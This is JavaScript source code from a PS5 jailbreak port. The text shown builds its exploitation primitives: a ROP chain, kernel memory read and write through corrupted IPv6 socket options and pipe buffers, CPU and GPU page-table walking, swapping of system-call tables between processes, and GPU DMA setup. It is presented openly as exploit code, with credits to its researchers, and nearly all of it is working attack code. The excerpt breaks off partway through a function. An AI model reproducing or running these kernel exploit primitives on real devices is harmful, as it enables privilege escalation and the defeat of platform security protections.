/*
 * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
 *            offsets bundled for FW 9.00 - 12.40.
 * MIT License - see LICENSE.
 *
 * Credits:
 *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
 *     (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
 *   - elfldr_1320 ELF loader binary: Gezine
 *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
 *   - Edigax: multi-core leak implementation (~48 min vs ~2h)
 *
 * Usage: see README.md.
 */

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBKERNEL_HANDLE = 0x2001n;

MAIN_CORE = 4;
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 16;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1n;
AIO_CMD_FLAG_MULTI = 0x1000n;
AIO_CMD_MULTI_READ = 0x1001n;
AIO_CMD_WRITE = 2n;
AIO_STATE_COMPLETE = 3n;
AIO_STATE_ABORTED = 4n;

SCE_KERNEL_ERROR_ESRCH = 0x80020003n;

RTP_SET = 1n;
PRI_REALTIME = 2n;

block_fd = 0xffffffffffffffffn;
unblock_fd = 0xffffffffffffffffn;
block_id = -1n;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0n;
ready_signal = 0n;
deletion_signal = 0n;
pipe_buf = 0n;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

/***** misc.js *****/
function find_pattern(buffer, pattern_string) {
    const parts = pattern_string.split(' ');
    const matches = [];

    for (let i = 0; i <= buffer.length - parts.length; i++) {
        let match = true;

        for (let j = 0; j < parts.length; j++) {
            if (parts[j] === '?') continue;
            if (buffer[i + j] !== parseInt(parts[j], 16)) {
                match = false;
                break;
            }
        }

        if (match) matches.push(i);
    }

    return matches;
}


function call_pipe_rop(fildes) {

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;

    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.pipe;
    fake_rop[rop_i++] = syscall_wrapper;

    // Store rax (read_fd) to fildes[0]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

    // Store rdx (write_fd) to fildes[4]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes + 4n;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret

    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;

    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    return rop_smash(obj_arr[0]);          // Call ROP
}

function create_pipe() {
    const fildes = malloc(0x10);

    call_pipe_rop(fildes);

    const read_fd = read32_uncompressed(fildes);
    const write_fd = read32_uncompressed(fildes + 4n);
    //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
    return [read_fd, write_fd];
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
    }
    return buffer;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8_uncompressed(addr + BigInt(i), buffer[i]);
    }
}

function get_nidpath() {
    const path_buffer = malloc(0x255);
    const len_ptr = malloc(8);

    write64_uncompressed(len_ptr, 0x255n);

    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
    if (ret === 0xffffffffffffffffn) {
        throw new Error("randomized_path failed : " + hex(ret));
    }

    return read_cstring(path_buffer);
}

function nanosleep(nsec) {
    const timespec = malloc(0x10);
    write64_uncompressed(timespec, BigInt(Math.floor(nsec / 1e9)));    // tv_sec
    write64_uncompressed(timespec + 8n, BigInt(nsec % 1e9));           // tv_nsec
    syscall(SYSCALL.nanosleep, timespec);
}

function check_jailbroken() {
    if (!is_jailbroken()) {
        throw new Error("process is not jailbroken")
    }
}

function file_exists(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);

    if (fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        return true;
    } else {
        return false;
    }
}

function read_file(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("file not exist: " + path);
    }

    const stat_buf = malloc(0x100);
    const fstat_result = syscall(SYSCALL.fstat, fd, stat_buf);
    if (fstat_result === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("fstat failed for: " + path);
    }

    const file_size = read64_uncompressed(stat_buf + 0x48n);

    const buffer = malloc(Number(file_size));
    const bytes_read = syscall(SYSCALL.read, fd, buffer, file_size);

    syscall(SYSCALL.close, fd);

    if (bytes_read !== file_size) {
        throw new Error("failed to read complete file: " + path);
    }

    return read_buffer(buffer, Number(file_size));
}

function write_file(path, text) {
    const mode = 0x1ffn; // 777
    const path_addr = alloc_string(path);
    const data_addr = alloc_string(text);

    const flags = O_CREAT | O_WRONLY | O_TRUNC;
    const fd = syscall(SYSCALL.open, path_addr, flags, mode);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("open failed for " + path + " fd: " + hex(fd));
    }

    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
    if (written === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("write failed : " + hex(written));
    }

    syscall(SYSCALL.close, fd);
    return Number(written); // number of bytes written
}
/***** kernel.js *****/
kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    //const decoder = new TextDecoder('utf-8');
    let result = "";

    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;

        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }

        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(let i = 0; i < null_pos; i++)
                {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }

        for(let i = 0; i < chunk.length; i++)
        {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr + BigInt(chunk.length);
    }

    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;

    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();

    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);

    write64_uncompressed(pktinfo_size_store, 0x14n);

    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);

    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);

    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);

    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
   if (kaddr === null || kaddr === undefined ||
       uaddr === null || uaddr === undefined ||
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
   if (kaddr === null || kaddr === undefined ||
       uaddr === null || uaddr === undefined ||
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }


    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }

    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// CPU page table definitions
CPU_PDE_SHIFT = {
    PRESENT: 0,
    RW: 1,
    USER: 2,
    WRITE_THROUGH: 3,
    CACHE_DISABLE: 4,
    ACCESSED: 5,
    DIRTY: 6,
    PS: 7,
    GLOBAL: 8,
    XOTEXT: 58,
    PROTECTION_KEY: 59,
    EXECUTE_DISABLE: 63
};

CPU_PDE_MASKS = {
    PRESENT: 1n,
    RW: 1n,
    USER: 1n,
    WRITE_THROUGH: 1n,
    CACHE_DISABLE: 1n,
    ACCESSED: 1n,
    DIRTY: 1n,
    PS: 1n,
    GLOBAL: 1n,
    XOTEXT: 1n,
    PROTECTION_KEY: 0xfn,
    EXECUTE_DISABLE: 1n
};

CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
CPU_PG_PS_FRAME = 0x000fffffffe00000n;

function cpu_pde_field(pde, field) {
    const shift = CPU_PDE_SHIFT[field];
    const mask = CPU_PDE_MASKS[field];
    return Number((pde >> BigInt(shift)) & mask);
}

function cpu_walk_pt(cr3, vaddr) {
    if (!vaddr || !cr3) {
        throw new Error("cpu_walk_pt: invalid arguments");
    }

    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
    const pde_index = (vaddr >> 21n) & 0x1ffn;
    const pte_index = (vaddr >> 12n) & 0x1ffn;

    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
        return null;
    }

    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);

    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
        return null;
    }

    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);

    if (cpu_pde_field(pde, "PRESENT") !== 1) {
        return null;
    }

    if (cpu_pde_field(pde, "PS") === 1) {
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
    }

    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
    const pte = kernel.read_qword(pte_va);

    if (cpu_pde_field(pte, "PRESENT") !== 1) {
        return null;
    }

    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
}

function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

function get_proc_cr3(proc) {
    check_kernel_rw();

    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);

    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
}

function virt_to_phys(virt_addr, cr3) {
    check_kernel_rw();
    if (!kernel.addr.dmap_base || !virt_addr) {
        throw new Error("virt_to_phys: invalid arguments");
    }

    cr3 = cr3 || kernel.addr.kernel_cr3;
    return cpu_walk_pt(cr3, virt_addr);
}

function phys_to_dmap(phys_addr) {
    if (!kernel.addr.dmap_base || !phys_addr) {
        throw new Error("phys_to_dmap: invalid arguments");
    }
    return kernel.addr.dmap_base + phys_addr;
}

// Replace curproc sysent with sysent of other PS5 process
// Note: failure to restore curproc sysent will have side effect on the game/PS
function run_with_ps5_syscall_enabled(f) {
    check_kernel_rw();

    const target_proc_name = "SceGameLiveStreaming"; // arbitrarily chosen PS5 process

    const target_proc = find_proc_by_name(target_proc_name);
    if (!target_proc) {
        throw new Error("failed to find proc addr of " + target_proc_name);
    }

    const cur_sysent = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_SYSENT);  // struct sysentvec
    const target_sysent = kernel.read_qword(target_proc + kernel_offset.PROC_SYSENT);

    const cur_table_size = kernel.read_dword(cur_sysent); // sv_size
    const target_table_size = kernel.read_dword(target_sysent);

    const cur_table = kernel.read_qword(cur_sysent + 0x8n); // sv_table
    const target_table = kernel.read_qword(target_sysent + 0x8n);

    // Replace with target sysent
    kernel.write_dword(cur_sysent, target_table_size);
    kernel.write_qword(cur_sysent + 0x8n, target_table);

    try {
        f();
    } catch (e) {
        logger.log('run_with_ps5_syscall_enabled failed : ' + e.message);
        logger.log(e.stack);
    } finally {
        // Always restore back
        kernel.write_dword(cur_sysent, cur_table_size);
        kernel.write_qword(cur_sysent + 0x8n, cur_table);
    }
}

kernel_offset = null;

function find_vmspace_pmap_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);

    // Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1C8n;

    for (let i = 1; i <= 6; i++) {
        const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
        const offset_diff = Number(scan_val - vmspace);

        if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
            return cur_scan_offset + BigInt(i * 8);
        }
    }

    throw new Error("failed to find VMSPACE_VM_PMAP offset");
}


function find_vmspace_vmid_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);

    // Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1D4n;

    for (let i = 1; i <= 8; i++) {
        const scan_offset = cur_scan_offset + BigInt(i * 4);
        const scan_val = Number(kernel.read_dword(vmspace + scan_offset));

        if (scan_val > 0 && scan_val <= 0x10) {
            return scan_offset;
        }
    }

    throw new Error("failed to find VMSPACE_VM_VMID offset");
}

function find_proc_offsets() {
    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);

    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");

    if (p_comm_sign.length === 0) {
        throw new Error("failed to find offset for PROC_COMM");
    }

    if (p_sysent_sign.length === 0) {
        throw new Error("failed to find offset for PROC_SYSENT");
    }

    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);

    return {
        PROC_COMM: p_comm_offset,
        PROC_SYSENT: p_sysent_offset
    };
}

function find_additional_offsets() {
    const proc_offsets = find_proc_offsets();

    const vm_map_pmap_offset = find_vmspace_pmap_offset();
    const vm_map_vmid_offset = find_vmspace_vmid_offset();

    return {
        PROC_COMM: proc_offsets.PROC_COMM,
        PROC_SYSENT: proc_offsets.PROC_SYSENT,
        VMSPACE_VM_PMAP: vm_map_pmap_offset,
        VMSPACE_VM_VMID: vm_map_vmid_offset,
    };
}

function update_kernel_offsets() {
    const offsets = find_additional_offsets();

    for (const [key, value] of Object.entries(offsets)) {
        kernel_offset[key] = value;
    }
}

/***** gpu.js *****/
// GPU page table

GPU_PDE_SHIFT = {
    VALID: 0,
    IS_PTE: 54,
    TF: 56,
    BLOCK_FRAGMENT_SIZE: 59,
};

GPU_PDE_MASKS = {
    VALID: 1n,
    IS_PTE: 1n,
    TF: 1n,
    BLOCK_FRAGMENT_SIZE: 0x1fn,
};

GPU_PDE_ADDR_MASK = 0x0000ffffffffffc0n;

function gpu_pde_field(pde, field) {
    const shift = GPU_PDE_SHIFT[field];
    const mask = GPU_PDE_MASKS[field];
    return (pde >> BigInt(shift)) & mask;
}

function gpu_walk_pt(vmid, virt_addr) {
    const pdb2_addr = get_pdb2_addr(vmid);

    const pml4e_index = (virt_addr >> 39n) & 0x1ffn;
    const pdpe_index = (virt_addr >> 30n) & 0x1ffn;
    const pde_index = (virt_addr >> 21n) & 0x1ffn;

    // PDB2
    const pml4e = kernel.read_qword(pdb2_addr + pml4e_index * 8n);

    if (gpu_pde_field(pml4e, "VALID") !== 1n) {
        return null;
    }

    // PDB1
    const pdp_base_pa = pml4e & GPU_PDE_ADDR_MASK;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);

    if (gpu_pde_field(pdpe, "VALID") !== 1n) {
        return null;
    }

    // PDB0
    const pd_base_pa = pdpe & GPU_PDE_ADDR_MASK;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);

    if (gpu_pde_field(pde, "VALID") !== 1n) {
        return null;
    }

    if (gpu_pde_field(pde, "IS_PTE") === 1n) {
        return [pde_va, 0x200000n]; // 2MB
    }

    // PTB
    const fragment_size = gpu_pde_field(pde, "BLOCK_FRAGMENT_SIZE");
    const offset = virt_addr & 0x1fffffn;
    const pt_base_pa = pde & GPU_PDE_ADDR_MASK;

    let pte_index, pte;
    let pte_va, page_size;

    if (fragment_size === 4n) {
        pte_index = offset >> 16n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        pte = kernel.read_qword(pte_va);

        if (gpu_pde_field(pte, "VALID") === 1n && gpu_pde_field(pte, "TF") === 1n) {
            pte_index = (virt_addr & 0xffffn) >> 13n;
            pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
            page_size = 0x2000n; // 8KB
        } else {
            page_size = 0x10000n; // 64KB
        }
    } else if (fragment_size === 1n) {
        pte_index = offset >> 13n;
        pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
        page_size = 0x2000n; // 8KB
    }

    return [pte_va, page_size];
}

// Kernel r/w primitives based on GPU DMA

gpu = {};

gpu.dmem_size = 2n * 0x100000n; // 2MB
gpu.fd = null; // GPU device file descriptor

// Direct ioctl helper functions

gpu.build_command_descriptor = function(gpu_addr, size_in_bytes) {
    // Each descriptor is 16 bytes (2 qwords)

    const desc = malloc(16);
    const size_in_dwords = BigInt(size_in_bytes) >> 2n;

    // First qword: (gpu_addr_low32 << 32) | 0xC0023F00
    const qword0 = ((gpu_addr & 0xFFFFFFFFn) << 32n) | 0xC0023F00n;

    // Second qword: (size_in_dwords << 32) | (gpu_addr_high16)
    const qword1 = ((size_in_dwords & 0xFFFFFn) << 32n) | ((gpu_addr >> 32n) & 0xFFFFn);

    write64_uncompressed(desc, qword0);
    write64_uncompressed(desc + 8n, qword1);

    return desc;
};

gpu.ioctl_submit_commands = function(pipe_id, cmd_count, cmd_descriptors_ptr) {
    // ioctl 0xC0108102
    // Structure: [dword pipe_id][dword count][qword cmd_buf_ptr]

    const submit_struct = malloc(0x10);
    write32_uncompressed(submit_struct + 0x0n, BigInt(pipe_id));
    write32_uncompressed(submit_struct + 0x4n, BigInt(cmd_count));
    write64_uncompressed(submit_struct + 0x8n, cmd_descriptors_ptr);

    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0108102n, submit_struct);
    if (ret !== 0n) {
        throw new Error("ioctl submit failed: " + hex(ret));
    }
};

// may be not needed...
gpu.ioctl_gpu_sync = function() {
    // ioctl 0xC0048117
    // Structure: [dword value] (set to 0)

    const sync_struct = malloc(0x4);
    write32_uncompressed(sync_struct, 0n);

    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048117n, sync_struct);

};

gpu.ioctl_wait_done = function() {
    // ioctl 0xC0048116
    // Structure: [dword value] (set to 0)

    const wait_struct = malloc(0x4);
    write32_uncompressed(wait_struct, 0n);

    const ret = syscall(SYSCALL.ioctl, gpu.fd, 0xC0048116n, wait_struct);

    // We just ignore error lol
    //if (ret !== 0n) {
    //    throw new Error("ioctl wait_done failed: " + hex(ret));
    //}

    // Manual sleep - temp fix
    nanosleep(1000000000);
};

gpu.setup = function() {
    check_kernel_rw();

    // Open GPU device directly
    gpu.fd = syscall(SYSCALL.open, alloc_string("/dev/gc"), O_RDWR);
    if (gpu.fd === 0xffffffffffffffffn) {
        throw new Error("Failed to open /dev/gc");
    }

    const prot_ro = PROT_READ | PROT_WRITE | GPU_READ;
    const prot_rw = prot_ro | GPU_WRITE;

    const victim_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const transfer_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);
    const cmd_va = alloc_main_dmem(gpu.dmem_size, prot_rw, MAP_NO_COALESCE);

    const curproc_cr3 = get_proc_cr3(kernel.addr.curproc);
    const victim_real_pa = virt_to_phys(victim_va, curproc_cr3);

    const result = get_ptb_entry_of_relative_va(victim_va);
    if (!result) {
        throw new Error("failed to setup gpu primitives");
    }

    const [victim_ptbe_va, page_size] = result;

    if (!victim_ptbe_va || page_size !== gpu.dmem_size) {
        throw new Error("failed to setup gpu primitives");
    }

    if (syscall(SYSCALL.mprotect, victim_va, gpu.dmem_size, prot_ro) === 0xffffffffffffffffn) {
        throw new Error("mprotect() error");
    }

    const initial_victim_ptbe_for_ro = kernel.read_qword(victim_ptbe_va);
    const cleared_victim_ptbe_for_ro = initial_victim_ptbe_for_ro & (~victim_real_pa);

    gpu.victim_va = victim_va;
    gpu.transfer_va = transfer_va;
    gpu.cmd_va = cmd_va;
    gpu.victim_ptbe_va = victim_ptbe_va;
    gpu.cleared_victim_ptbe_for_ro = cleared_victim_ptbe_for_ro;
};

gpu.pm4_type3_header = function(opcode, count) {

